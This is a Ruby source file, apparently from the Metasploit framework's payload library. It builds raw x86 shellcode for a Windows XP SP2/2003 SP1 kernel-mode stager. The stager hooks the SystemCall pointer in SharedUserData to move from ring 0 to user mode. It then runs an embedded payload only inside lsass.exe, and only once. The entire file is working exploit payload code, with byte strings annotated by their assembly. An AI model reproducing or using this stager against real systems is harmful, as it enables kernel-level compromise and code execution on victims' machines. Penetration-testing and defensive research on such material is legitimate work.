module Rex
module Payloads
module Win32
module Kernel

#
# Stagers are responsible for reading in another payload and executing it.
# The reading in of the payload may actually be as simple as copying it to
# another location.  The executing of it may be done either directly or
# indirectly.
#
module Stager

	#
	# XP SP2/2K3 SP1 ONLY
	#
	# Returns a kernel-mode stager that transitions from r0 to r3 by placing
	# code in an unused portion of SharedUserData and then pointing the
	# SystemCall attribute to that unused portion.  This has the effect of
	# causing the custom code to be called every time a user-mode process
	# tries to make a system call.  The returned payload also checks to make
	# sure that it's running in the context of lsass before actually running
	# the embedded payload.
	#
	def self.sud_syscall_hook(opts = {})
		r0_recovery = opts['RecoveryStub'] || Recovery.default
		r3_payload  = opts['UserModeStub'] || ''
		r3_prefix   = _run_only_in_win32proc_stub("\xff\x25\x08\x03\xfe\x7f", opts)
		r3_size     = ((r3_prefix.length + r3_payload.length + 3) & ~0x3) / 4
		
		r0_stager =
			"\xEB" + [0x22 + r0_recovery.length].pack('C') + # jmp short 0x27
			"\xBB\x01\x03\xDF\xFF"                         + # mov ebx,0xffdf0301
			"\x4B"                                         + # dec ebx
			"\xFC"                                         + # cld
			"\x8D\x7B\x7C"                                 + # lea edi,[ebx+0x7c]
			"\x5E"                                         + # pop esi
			"\x6A" + [r3_size].pack('C')                   + # push byte num_dwords
			"\x59"                                         + # pop ecx
			"\xF3\xA5"                                     + # rep movsd
			"\xBF\x7C\x03\xFE\x7F"                         + # mov edi,0x7ffe037c
			"\x39\x3B"                                     + # cmp [ebx],edi
			"\x74\x09"                                     + # jz 
			"\x8B\x03"                                     + # mov eax,[ebx]
			"\x8D\x4B\x08"                                 + # lea ecx,[ebx+0x8]
			"\x89\x01"                                     + # mov [ecx],eax
			"\x89\x3B"                                     + # mov [ebx],edi
			r0_recovery +
			"\xe8" + [0xffffffd9 - r0_recovery.length].pack('V') + # call 0x2
			r3_prefix +
			r3_payload

		return r0_stager
	end

protected

	#
	# This stub is used by stagers to check to see if the code is
	# running in the context of a user-mode system process.  By default,
	# this process is lsass.exe.  If it isn't, it runs the code
	# specified by append.  Otherwise, it jumps past that code and
	# into what should be the expected r3 payload to execute.  This
	# stub also makes sure that the payload does not run more than
	# once.
	#
	def self._run_only_in_win32proc_stub(append = '', opts = {}) 
		opts['RunInWin32Process'] = "lsass.exe" if opts['RunInWin32Process'].nil?

		process  = opts['RunInWin32Process'].downcase
		checksum = 
			process[0]         +
			(process[2] << 8)  +
			(process[1] << 16) +
			(process[3] << 24)

		"\x60"                                 + # pusha
		"\x6A\x30"                             + # push byte +0x30
		"\x58"                                 + # pop eax
		"\x99"                                 + # cdq
		"\x64\x8B\x18"                         + # mov ebx,[fs:eax]
		"\x39\x53\x0C"                         + # cmp [ebx+0xc],edx
		"\x74\x26"                             + # jz 0x5f
		"\x8B\x5B\x10"                         + # mov ebx,[ebx+0x10]
		"\x8B\x5B\x3C"                         + # mov ebx,[ebx+0x3c]
		"\x83\xC3\x28"                         + # add ebx,byte +0x28
		"\x8B\x0B"                             + # mov ecx,[ebx]
		"\x03\x4B\x03"                         + # add ecx,[ebx+0x3]
		"\x81\xF9" + [checksum].pack('V')      + # cmp ecx,prochash
		"\x75\x10"                             + # jnz 0x5f
		"\x64\x8B\x18"                         + # mov ebx,[fs:eax]
		"\x43"                                 + # inc ebx
		"\x43"                                 + # inc ebx
		"\x43"                                 + # inc ebx
		"\x80\x3B\x01"                         + # cmp byte [ebx],0x1
		"\x74\x05"                             + # jz 0x5f
		"\xC6\x03\x01"                         + # mov byte [ebx],0x1
		"\xEB" + [append.length + 1].pack('C') + # jmp stager
		"\x61" + append						        # restore regs
	end


end

end
end
end
end